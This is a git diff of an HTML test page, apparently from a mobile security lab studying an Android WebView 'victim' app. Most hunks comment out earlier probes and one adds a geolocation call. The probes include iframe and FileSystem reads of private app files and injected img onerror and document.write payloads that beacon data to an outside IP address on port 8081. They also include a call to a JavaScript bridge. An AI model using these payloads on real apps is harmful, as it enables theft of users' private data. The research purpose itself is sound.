@@ -134,41 +134,43 @@
             <a href="fb://webview/?url=http://monojo.github.io">facebook test</a>
             <!--<img id="haha" src='http://www.hyperlinkcode.com/images/sample-image.jpg' }>-->
             <div id="div1"><p> haha</p></div>
+
+            <!--geolocation call-->
             <script>
                 //FileReader() test
-                function handleFiles() {
-                    var selectedFile = document.getElementById("files").files[0];//获取读取的File对象
-                    var name = selectedFile.name;//读取选中文件的文件名
-                    var size = selectedFile.size;//读取选中文件的大小
-                    console.log("文件名:" + name + "大小：" + size);
+                // function handleFiles() {
+                //     var selectedFile = document.getElementById("files").files[0];//获取读取的File对象
+                //     var name = selectedFile.name;//读取选中文件的文件名
+                //     var size = selectedFile.size;//读取选中文件的大小
+                //     console.log("文件名:" + name + "大小：" + size);
+                //
+                //     var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。
+                //     reader.readAsText(selectedFile);//读取文件的内容
+                //
+                //     reader.onload = function () {
+                //         console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。
+                //     };
+                // }
 
-                    var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。
-                    reader.readAsText(selectedFile);//读取文件的内容
-
-                    reader.onload = function () {
-                        console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。
-                    };
-                }
-
-                var time = performance.now();
-                console.log(time);
-                console.log(window.navigator.appCodeName);
-                console.log(window.navigator.appName);
-                var id = document.getElementById('div1');
-                var img = document.createElement('img');
-                img.src = 'http://www.hyperlinkcode.com/images/sample-image.jpg';
-                id.appendChild(img);
+                // var time = performance.now();
+                // console.log(time);
+                // console.log(window.navigator.appCodeName);
+                // console.log(window.navigator.appName);
+                // var id = document.getElementById('div1');
+                // var img = document.createElement('img');
+                // img.src = 'http://www.hyperlinkcode.com/images/sample-image.jpg';
+                // id.appendChild(img);
 
                 // create a new div element
-                var newDiv = document.createElement("div");
-                // and give it some content
-                var newContent = document.createTextNode("Hi there and greetings!");
-                // add the text node to the newly created div
-                newDiv.appendChild(newContent);
-
-                // add the newly created element and its content into the DOM
-                var currentDiv = document.getElementById("div1");
-                currentDiv.appendChild(newDiv);
+                // var newDiv = document.createElement("div");
+                // // and give it some content
+                // var newContent = document.createTextNode("Hi there and greetings!");
+                // // add the text node to the newly created div
+                // newDiv.appendChild(newContent);
+                //
+                // // add the newly created element and its content into the DOM
+                // var currentDiv = document.getElementById("div1");
+                // currentDiv.appendChild(newDiv);
                 <!--let batteryIsCharging  = false;-->
                 <!--navigator.getBattery().then(function(battery) {-->
                 <!--batteryIsCharging = battery.charging;-->
@@ -178,11 +180,10 @@
                 <!--});-->
                 <!--});-->
                 <!--console.log("battery?" + (batteryIsCharging? "yes"  : "no"));-->
-                console.log("wtf");
+                // console.log("wtf");
                 <!--var type = navigator.connection.type;-->
-                <!--console.log(type);-->
-                console.log(navigator.hardwareConcurrency);
-                // Check for Geolocation API permissions
+
+                // // Check for Geolocation API permissions
                 navigator.permissions.query({name: 'geolocation'})
                     .then(function (permissionStatus) {
                         console.log('geolocation permission state is ', permissionStatus.state);
@@ -192,80 +193,8 @@
                                 this.state);
                         };
                     });
-                // init_dup();
-
-                var audioContext = new AudioContext();
-                var audioInput = null,
-                    realAudioInput = null,
-                    inputPoint = null,
-                    audioRecorder = null;
-                var rafID = null;
-                var analyserContext = null;
-                var canvasWidth, canvasHeight;
-                var recIndex = 0;
-
-                function gotStream(stream) {
-                    inputPoint = audioContext.createGain();
-
-                    // Create an AudioNode from the stream.
-                    realAudioInput = audioContext.createMediaStreamSource(stream);
-                    audioInput = realAudioInput;
-                    audioInput.connect(inputPoint);
-
-                    analyserNode = audioContext.createAnalyser();
-                    analyserNode.fftSize = 2048;
-                    inputPoint.connect(analyserNode);
-
-                    audioRecorder = new Recorder(inputPoint);
-
-                    zeroGain = audioContext.createGain();
-                    zeroGain.gain.value = 0.0;
-                    inputPoint.connect(zeroGain);
-                    zeroGain.connect(audioContext.destination);
-                    // updateAnalysers();
-                }
 
                 function getLocation() {
-                    // if (!navigator.getUserMedia)
-                    //     navigator.getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
-                    // navigator.getUserMedia(
-                    //     {
-                    //         "audio": {
-                    //             "mandatory": {
-                    //                 "googEchoCancellation": "false",
-                    //                 "googAutoGainControl": "false",
-                    //                 "googNoiseSuppression": "false",
-                    //                 "googHighpassFilter": "false"
-                    //             },
-                    //             "optional": []
-                    //         },
-                    //     }, gotStream, function (e) {
-                    //         alert('Error getting audio');
-                    //         console.log(e);
-                    //     });
-                    // navigator.mediaDevices.getUserMedia({audio: true}, function(stream) {
-                    //     window.AudioContext = window.AudioContext ||
-                    //         window.webkitAudioContext;
-                    //     var context = new AudioContext();
-                    //     var microphone = context.createMediaStreamSource(stream);
-                    //     var filter = context.createBiquadFilter();
-                    //
-                    //     // microphone -> filter -> destination.
-                    //     microphone.connect(filter);
-                    //     filter.connect(context.destination);
-                    // }, null);
-
-                    // navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
-                    // if (navigator.vibrate) {
-                    //     <!--console.log("has vibrate");-->
-                    //     <!--var w = window.navigator.vibrate(200);-->
-                    //     var v = navigator.vibrate([500]);
-                    //     if (v) {
-                    //         console.log("vib succ");
-                    //     } else {
-                    //         console.log("vib failed");
-                    //     }
-                    // }
                     if (navigator.geolocation) {
                         console.log("getting position");
                         navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -298,132 +227,137 @@
                             break;
                     }
                 }
+                //ZX call geolocation
+                getLocation();
             </script>
 
-            <script>
-                // var div = document.createElement('div');
-                // // div.innerHTML = "my <b>new</b> skill - <large>DOM maniuplation!</large>";
-                // // set style
-                // div.style.color = 'red';
-                // // better to use CSS though - just set class
-                // div.setAttribute('class', 'myclass'); // and make sure myclass has some styles in css
-                // var html = "<script> console.log('ZX:div');<\/script>";
-                // div.innerHTML = html;
-                // document.body.appendChild(div);
-                // document.getElementsByTagName("body").innerHTML = div;
+            <!--<script>-->
+                <!--// var div = document.createElement('div');-->
+                <!--// // div.innerHTML = "my <b>new</b> skill - <large>DOM maniuplation!</large>";-->
+                <!--// // set style-->
+                <!--// div.style.color = 'red';-->
+                <!--// // better to use CSS though - just set class-->
+                <!--// div.setAttribute('class', 'myclass'); // and make sure myclass has some styles in css-->
+                <!--// var html = "<script> console.log('ZX:div');<\/script>";-->
+                <!--// div.innerHTML = html;-->
+                <!--// document.body.appendChild(div);-->
+                <!--// document.getElementsByTagName("body").innerHTML = div;-->
 
-                function readfile() {
-                    alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);
-                    console.debug(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);
-                }
+                <!--function readfile() {-->
+                    <!--alert(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
+                    <!--console.debug(document.getElementById('iframe').contentDocument.body.firstChild.innerHTML);-->
+                <!--}-->
 
-                function handleFiles() {
-                    var selectedFile = document.getElementById("files").files[0];//获取读取的File对象
-                    var name = selectedFile.name;//读取选中文件的文件名
-                    var size = selectedFile.size;//读取选中文件的大小
-                    console.log("文件名:" + name + "大小：" + size);
+                <!--function handleFiles() {-->
+                    <!--var selectedFile = document.getElementById("files").files[0];//获取读取的File对象-->
+                    <!--var name = selectedFile.name;//读取选中文件的文件名-->
+                    <!--var size = selectedFile.size;//读取选中文件的大小-->
+                    <!--console.log("文件名:" + name + "大小：" + size);-->
 
-                    var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。
-                    reader.readAsText(selectedFile);//读取文件的内容
+                    <!--var reader = new FileReader();//这里是核心！！！读取操作就是由它完成的。-->
+                    <!--reader.readAsText(selectedFile);//读取文件的内容-->
 
-                    reader.onload = function () {
-                        console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。
-                    };
-                }
-            </script>
+                    <!--reader.onload = function () {-->
+                        <!--console.log(this.result);//当读取完成之后会回调这个函数，然后此时文件的内容存储到了result中。直接操作即可。-->
+                    <!--};-->
+                <!--}-->
+            <!--</script>-->
 
-            <script>
-                function errorHandler(e) {
-                    var msg = '';
+            <!--<script>-->
+                <!--function errorHandler(e) {-->
+                    <!--var msg = '';-->
 
-                    switch (e.code) {
-                        case FileError.QUOTA_EXCEEDED_ERR:
-                            msg = 'QUOTA_EXCEEDED_ERR';
-                            break;
-                        case FileError.NOT_FOUND_ERR:
-                            msg = 'NOT_FOUND_ERR';
-                            break;
-                        case FileError.SECURITY_ERR:
-                            msg = 'SECURITY_ERR';
-                            break;
-                        case FileError.INVALID_MODIFICATION_ERR:
-                            msg = 'INVALID_MODIFICATION_ERR';
-                            break;
-                        case FileError.INVALID_STATE_ERR:
-                            msg = 'INVALID_STATE_ERR';
-                            break;
-                        default:
-                            msg = 'Unknown Error';
-                            break;
-                    };
+                    <!--switch (e.code) {-->
+                        <!--case FileError.QUOTA_EXCEEDED_ERR:-->
+                            <!--msg = 'QUOTA_EXCEEDED_ERR';-->
+                            <!--break;-->
+                        <!--case FileError.NOT_FOUND_ERR:-->
+                            <!--msg = 'NOT_FOUND_ERR';-->
+                            <!--break;-->
+                        <!--case FileError.SECURITY_ERR:-->
+                            <!--msg = 'SECURITY_ERR';-->
+                            <!--break;-->
+                        <!--case FileError.INVALID_MODIFICATION_ERR:-->
+                            <!--msg = 'INVALID_MODIFICATION_ERR';-->
+                            <!--break;-->
+                        <!--case FileError.INVALID_STATE_ERR:-->
+                            <!--msg = 'INVALID_STATE_ERR';-->
+                            <!--break;-->
+                        <!--default:-->
+                            <!--msg = 'Unknown Error';-->
+                            <!--break;-->
+                    <!--}-->
+                    <!--;-->
 
-                    console.log('Error: ' + msg);
-                }
-                window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;
-                console.log('requestFileSystem', window.requestFileSystem);
-                window.webkitStorageInfo.requestQuota(PERSISTENT, 1024*1024, function(grantedBytes) {
-                    window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler);
-                }, function(e) {
-                    console.log('Error', e);
-                });
-                function onInitFs(fs) {
-                    // console.log('Opened file system: ' + fs.name);
-                    // window.requestFileSystem(type, size, successCallback, opt_errorCallback)
-                    fs.root.getFile("/data/data/com.example.moslab.webviewvictim/files/abc.txt", {}, function(fileEntry) {
-                        fileEntry.file(function(file){
-                            var  reader = FileReader();
-                            reader.onloadend(function(e){
-                                var txtArea = document.createElement('textarea');
-                                txtArea.value = this.result;
-                                document.body.appendChild(txtArea);
-                            });
-                            reader.readAsText(file);
-                        }, errorHandler);
-                        // fileEntry.isFile === true
-                        // fileEntry.name == 'log.txt'
-                        // fileEntry.fullPath == '/log.txt'
+                    <!--console.log('Error: ' + msg);-->
+                <!--}-->
 
-                    }, errorHandler);
-                }
+                <!--window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;-->
+                <!--console.log('requestFileSystem', window.requestFileSystem);-->
+                <!--window.webkitStorageInfo.requestQuota(PERSISTENT, 1024 * 1024, function (grantedBytes) {-->
+                    <!--window.webkitRequestFileSystem(PERSISTENT, grantedBytes, onInitFs, errorHandler);-->
+                <!--}, function (e) {-->
+                    <!--console.log('Error', e);-->
+                <!--});-->
 
-                window.requestFileSystem(window.TEMPORARY, 5*1024*1024 /*5MB*/, onInitFs, errorHandler);
-            </script>
+                <!--function onInitFs(fs) {-->
+                    <!--// console.log('Opened file system: ' + fs.name);-->
+                    <!--// window.requestFileSystem(type, size, successCallback, opt_errorCallback)-->
+                    <!--fs.root.getFile("/data/data/com.example.moslab.webviewvictim/files/abc.txt", {}, function (fileEntry) {-->
+                        <!--fileEntry.file(function (file) {-->
+                            <!--var reader = FileReader();-->
+                            <!--reader.onloadend(function (e) {-->
+                                <!--var txtArea = document.createElement('textarea');-->
+                                <!--txtArea.value = this.result;-->
+                                <!--document.body.appendChild(txtArea);-->
+                            <!--});-->
+                            <!--reader.readAsText(file);-->
+                        <!--}, errorHandler);-->
+                        <!--// fileEntry.isFile === true-->
+                        <!--// fileEntry.name == 'log.txt'-->
+                        <!--// fileEntry.fullPath == '/log.txt'-->
 
-            <iframe src="https://bumoslab.github.io">
-                <p>Your browser does not support iframes.</p>
-            </iframe>
+                    <!--}, errorHandler);-->
+                <!--}-->
 
-            <iframe id='iframe' src="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt"
-                    onload='readfile()'></iframe>
-            <a id='hrefFile' href="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt" onload='readfile()'
-               class="button">
-                <small>hrefFile</small>
-            </a>
+                <!--window.requestFileSystem(window.TEMPORARY, 5 * 1024 * 1024 /*5MB*/, onInitFs, errorHandler);-->
+            <!--</script>-->
 
-            <pre><code>$ cd your_repo_root/repo_name
-$ git fetch origin
-$ git checkout gh-pages
-</code></pre>
-            <div id="http_img"></div>
-            <script>
-                function loc(){
-                    b=document.createElement('img');
-                    m="abc";
-                    console.log("ZX:"+m);
-                    b.src="http://23.83.235.55:8081/"+m;
-                }
-            </script>
+            <!--<iframe src="https://bumoslab.github.io">-->
+                <!--<p>Your browser does not support iframes.</p>-->
+            <!--</iframe>-->
+
+            <!--<iframe id='iframe' src="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt"-->
+                    <!--onload='readfile()'></iframe>-->
+            <!--<a id='hrefFile' href="file:///data/data/com.example.moslab.webviewvictim/files/abc.txt" onload='readfile()'-->
+               <!--class="button">-->
+                <!--<small>hrefFile</small>-->
+            <!--</a>-->
+
+            <!--<pre><code>$ cd your_repo_root/repo_name-->
+<!--$ git fetch origin-->
+<!--$ git checkout gh-pages-->
+<!--</code></pre>-->
+            <!--<div id="http_img"></div>-->
+            <!--<script>-->
+                <!--function loc() {-->
+                    <!--b = document.createElement('img');-->
+                    <!--m = "abc";-->
+                    <!--console.log("ZX:" + m);-->
+                    <!--b.src = "http://23.83.235.55:8081/" + m;-->
+                <!--}-->
+            <!--</script>-->
             <!--<img src=x onerror=loc()>-->
             <!--<script>-->
-                <!--function loc2(){-->
-                    <!--var b=document.createElement('img');-->
-                    <!--var m="abc";-->
-                    <!--console.log("ZX:"+m);-->
-                    <!--b.src='http://23.83.235.55:8081/'+m;-->
-                    <!--// b.src='http://www.hyperlinkcode.com/images/sample-image.jpg';-->
-                    <!--var id = document.getElementById("http_img");-->
-                    <!--// id.appendChild(b);-->
-                <!--}-->
+            <!--function loc2(){-->
+            <!--var b=document.createElement('img');-->
+            <!--var m="abc";-->
+            <!--console.log("ZX:"+m);-->
+            <!--b.src='http://23.83.235.55:8081/'+m;-->
+            <!--// b.src='http://www.hyperlinkcode.com/images/sample-image.jpg';-->
+            <!--var id = document.getElementById("http_img");-->
+            <!--// id.appendChild(b);-->
+            <!--}-->
             <!--</script>-->
             <!--<img src=x onerror=loc2()>-->
             <!--<img src="http://23.83.235.55:8081/images2.jpg">-->
@@ -434,32 +368,32 @@ $ git checkout gh-pages
         </section>
 
         <!--&lt;!&ndash;<aside id="sidebar">&ndash;&gt;-->
-            <!--&lt;!&ndash;<p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme&ndash;&gt;-->
-                <!--&lt;!&ndash;by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>&ndash;&gt;-->
+        <!--&lt;!&ndash;<p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme&ndash;&gt;-->
+        <!--&lt;!&ndash;by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>&ndash;&gt;-->
         <!--</aside>-->
     </div>
 </div>
 
 
-<script>
-    // var str = "<div></div>";
-    var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";
-    // var str = "<script> console.log(\"ZX: from console\");<\/script>";
-    // document.getElementById('inner').innerHTML = str;
-    document.write(str);
-</script>
+<!--<script>-->
+    <!--// var str = "<div></div>";-->
+    <!--var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";-->
+    <!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
+    <!--// document.getElementById('inner').innerHTML = str;-->
+    <!--document.write(str);-->
+<!--</script>-->
 
 <!--<script>-->
-    <!--// var str = "<div></div>";-->
-    <!--var str = "<img src=x onerror='AndroidFunction.showToast(\"From img\"); b=document.createElement(\"img\");m=\"abc\";"-->
-        <!--+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;'>";-->
-    <!--var str = ""-->
-    <!--document.getElementById('inner').innerHTML = str;-->
+<!--// var str = "<div></div>";-->
+<!--var str = "<img src=x onerror='AndroidFunction.showToast(\"From img\"); b=document.createElement(\"img\");m=\"abc\";"-->
+<!--+ "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;'>";-->
+<!--var str = ""-->
+<!--document.getElementById('inner').innerHTML = str;-->
 <!--</script>-->
 <!--<script>-->
-    <!--// var str = "<div></div>";-->
-    <!--var str = "<img src=xx onerror='b=document.createElement(\"img\");b.src=\"http://23.83.235.55:8081/def\";'>";-->
-    <!--document.getElementById('inner2').innerHTML = str;-->
+<!--// var str = "<div></div>";-->
+<!--var str = "<img src=xx onerror='b=document.createElement(\"img\");b.src=\"http://23.83.235.55:8081/def\";'>";-->
+<!--document.getElementById('inner2').innerHTML = str;-->
 <!--</script>-->
 
 </body>
